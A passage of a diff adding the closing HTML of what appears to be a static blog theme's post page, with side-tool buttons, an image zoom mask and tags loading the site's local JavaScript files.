+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+
+    <!-- tablet toc -->
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
